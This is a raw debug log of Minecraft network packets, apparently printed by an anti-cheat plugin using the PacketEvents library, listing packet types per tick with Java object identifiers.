[6107] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5de378bf
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3a041ffb
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1381081a
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7a95b557
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3c751c3a
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@26943788
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3dce3a98
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6a260f7b
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7ea64ac9
[6107] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@79890ae2
(Silent) [6108] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@54e1d50f
[6108] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3eb42a41
[6108] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@66923f18
[6108] PONG: TransactionClientWrapper{action=6108, id=0}
[6108] TAB_COMPLETE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5f893b0e
[6108] TAB_COMPLETE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@728d767
[6108] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@18d103e1
(Silent) [6109] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@120074c1
[6109] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@59720465
[6109] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@65c30bd1
[6109] PONG: TransactionClientWrapper{action=6109, id=0}
[6109] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@419be60f
[6109] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@16a4b90e
[6109] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5fbcc693
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@225cd336
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3ce9e2ec
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@fb640b6
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3687978d
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@72862708
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@10b5536
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3c051651
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@36b4c5a3
[6109] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@75491a1a
(Silent) [6110] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@7a543826
[6110] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@169dbd2c
[6110] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4c0fcc61
[6110] PONG: TransactionClientWrapper{action=6110, id=0}
(Silent) [6111] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@cc81d44
[6111] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4c5151f2
[6111] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@84734c6
[6111] PONG: TransactionClientWrapper{action=6111, id=0}
[6111] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@650290cf
[6111] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6709eaee
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2111e93c
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@104108dc
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@613476f3
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@49c2bea1
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6734f6ac
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7fab157e
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3dea6796
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6101e13c
[6111] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2140ea26
(Silent) [6112] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@56dbe87f
[6112] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3db216b8
[6112] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@32408759
[6112] PONG: TransactionClientWrapper{action=6112, id=0}
[6112] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@106d5add
(Silent) [6113] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@476c2819
[6113] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@78948948
[6113] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@553e4734
[6113] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@63f27885
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@19336d94
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@45b16933
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@62119156
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1257fbc1
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@100a6bd2
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5ebc6011
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@30c9d1b1
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1dedbd9a
[6113] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5efa110e
(Silent) [6114] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@1ca2adda
[6114] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@63fb4e28
[6114] PONG: TransactionClientWrapper{action=6113, id=0}
[6114] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@1d414fbf
(Silent) [6115] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@504ca137
[6115] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6d3020e0
[6115] PONG: TransactionClientWrapper{action=6114, id=0}
[6115] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@63cc3e29
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5a7fa676
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4d543631
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@218f385b
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@23307735
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@45b3933
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@68d27237
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@30c7c296
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@106e8264
[6115] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4da1a3fb
(Silent) [6116] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@59dd2351
[6116] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@369933b2
[6116] PONG: TransactionClientWrapper{action=6115, id=0}
[6116] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@38c48485
(Silent) [6117] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@7f57e493
[6117] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5c5d5c5b
[6117] PONG: TransactionClientWrapper{action=6116, id=0}
[6117] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1c238250
[6117] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@635826c5
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7fa46687
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@492d52ac
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@491c68db
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6bd00133
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@371cd290
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@14874eed
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3e77b616
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@55c5f172
[6117] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@41c2108
(Silent) [6118] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@76124ade
[6118] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2a42f740
[6118] PONG: TransactionClientWrapper{action=6117, id=0}
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@29062318
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@5332092b
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@36c37624
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@b866f4b
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@138093c0
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@5038bbca
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@7de785bf
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@4523417f
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@522ac488
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@47d9c3ec
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@6527cd5
[6118] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@5925edd9
(Silent) [6119] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@43621832
[6119] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5d2f6cf1
[6119] PONG: TransactionClientWrapper{action=6118, id=0}
[6119] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5460021b
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@41417896
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@377c1e42
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1112b4b8
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@45b61c5b
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@f7949b3
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5820d810
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5c1310d8
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@29329bc5
[6119] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6c436b81
(Silent) [6120] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@73157ca4
[6120] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@32fdce41
[6120] PONG: TransactionClientWrapper{action=6119, id=0}
(Silent) [6121] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@33266d29
[6121] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@762c9d16
[6121] PONG: TransactionClientWrapper{action=6120, id=0}
[6121] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4bfddca5
[6121] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3c15b938
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@60c6f73d
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7290121e
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@57ade01d
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@46e05fa9
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@11c83757
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@63bad792
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5baf7ef0
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1ff66f3b
[6121] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4fd4811d
(Silent) [6122] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@57868529
[6122] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7a67d932
[6122] PONG: TransactionClientWrapper{action=6121, id=0}
[6122] CHAT_COMMAND_UNSIGNED: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5a9f7070
[6122] PLAYER_POSITION_AND_LOOK: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook@763c53af
[6122] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1d8bf81c
[6122] DESTROY_ENTITIES: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerDestroyEntities@59610cd6
(Silent) [6123] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@476a463
[6123] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@785cfb7a
[6123] PONG: TransactionClientWrapper{action=6122, id=0}
[6123] TELEPORT_CONFIRM: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6ce96ef5
[6123] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2e60206c
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7fb69eca
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@602e2d6d
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4717695b
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@685b4295
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2350c19a
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3284c5d8
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4e253f62
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7cd893d9
[6123] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5921c1c9
[6123] BLOCK_CHANGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerBlockChange@4d1f6530
(Silent) [6124] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@5cde0815
[6124] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@28a393b7
[6124] PONG: TransactionClientWrapper{action=6123, id=0}
[6124] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2342443f
(Silent) [6125] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@5c116982
[6125] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@551de29f
[6125] PONG: TransactionClientWrapper{action=6124, id=0}
[6125] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@181437d0
[6125] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6b9e245b
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1eb71f08
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@24841f5b
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1d1716ac
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7b145a9
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@21d84508
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2522e8af
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@a538d1
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@d34a961
[6125] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6ea75dca
[6126] KEEP_ALIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerKeepAlive@5cf2a721
(Silent) [6126] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@3fdd10e4
[6126] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@75b87fde
[6126] KEEP_ALIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientKeepAlive@5d6fafa9
[6126] PONG: TransactionClientWrapper{action=6125, id=0}
[6126] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@972f0c3
[6126] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@40708563
[6126] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@7680443c
(Silent) [6127] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@e39eec0
[6127] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5632afa2
[6127] PONG: TransactionClientWrapper{action=6126, id=0}
[6127] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@48d8b94f
[6127] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@c4776aa
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@781262ba
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3b9e9da5
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@36015958
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1448b14
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6aa82e34
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2594e571
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1963b302
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3cda8711
[6127] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1728c730
(Silent) [6128] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@220bd1b2
[6128] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@151507c9
[6128] PONG: TransactionClientWrapper{action=6127, id=0}
(Silent) [6129] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@7501e108
[6129] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@11ea5dca
[6129] PONG: TransactionClientWrapper{action=6128, id=0}
[6129] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7960b2e9
[6129] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@28a0ebb2
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@15369a20
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@56719141
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2afa969c
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5a8150a
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@24ee7805
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7ecf1e40
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7f3973
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@45ba7c33
[6129] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@12c31ad1
(Silent) [6130] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@220c957c
[6130] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@14782bd7
[6130] PONG: TransactionClientWrapper{action=6129, id=0}
(Silent) [6131] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@63822013
[6131] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6d353c8a
[6131] PONG: TransactionClientWrapper{action=6130, id=0}
[6131] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7b789efb
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@71e706d7
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2414bdaf
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@608114cb
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5f31c166
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@16a9b5e9
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@17519b56
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7f9ee23b
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2ef5265f
[6131] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7528d895
(Silent) [6132] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@1ff8eb90
[6132] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6eb8664d
[6132] PONG: TransactionClientWrapper{action=6131, id=0}
(Silent) [6133] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@650b50c6
[6133] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@66bfce9b
[6133] PONG: TransactionClientWrapper{action=6132, id=0}
[6133] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@61ffdbcd
[6133] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@52a05b17
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7f07d500
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6754076d
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@786a89f9
